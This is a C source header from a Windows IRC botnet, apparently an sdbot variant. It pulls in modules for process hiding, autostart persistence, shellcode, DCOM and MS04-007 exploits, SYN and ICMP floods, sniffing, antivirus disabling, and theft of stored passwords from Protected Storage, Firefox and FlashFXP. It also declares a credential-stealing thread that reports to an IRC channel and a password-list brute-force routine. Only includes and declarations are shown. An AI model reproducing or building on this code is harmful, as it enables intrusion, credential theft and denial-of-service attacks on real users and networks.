#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT	0x0403				// Very important for critical sections.
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <shellapi.h>
#include <mmsystem.h>
#include <time.h>
#include <Lm.h>
#include <winioctl.h>
#include <shlwapi.h>
#include <Winnetwk.h>
#include <ctype.h>
#include <lmat.h>
#include <lmremutl.h>
#include <psapi.h>
#include <process.h>
#include <winsvc.h>
#include <stdarg.h>
#include <malloc.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <assert.h>
#include <sqlext.h>
#include <vfw.h>
#include <shlobj.h>
#include <ntsecapi.h>


#include "Defines.h"
#include "driveinfo.h"
#include "sdbot05b.h"
#include "taskhider.h"
#include "threads.h"
#include "net.h"
#include "netutils.h"
#include "rndnick.h"
#include "loaddll.h"
#include "autostart.h"
#include "secure.h"
#include "visit.h"
#include "download.h"
#include "tcpip.h"
#include "hostauth.h"
#include "ftpd.h"
#include "advscan.h"
#include "misc.h"
#include "aliaslog.h"
#include "fphost.h"
#include "shellcode.h"
#include "dcom.h"
#include "tftpd.h"
#include "irc_send.h"
#include "sniffer.h"
#include "socks.h"
#include "avirus.h"
#include "processes.h"
//#include "wkssvc.h"
#include "ms04_007_asn1.h"
#include "synflood.h"
#include "icmpflood.h"
#include "pnp.h"
#include "httpd.h"
#include "vncrooter.h"
#include "netapi.h"
#include "mssql.h"
#include "cmd.h"
#include "pstore.h"
#include "firefox.h"
#include "Cmd.h"
#include "peer2peer.h"
#include "flashfxp.h"
#include "mydoom.h"


DWORD WINAPI pstore (LPVOID param);
#import "pstorec.dll" no_namespace
#include <psapi.h>

typedef struct pststrct
{
	SOCKET sock;
	char chan[128];
} pststrct;

BOOL TryPassList(EXINFO exinfo);//fast way :) add .header l8r i may removealladd here, yea when u clean it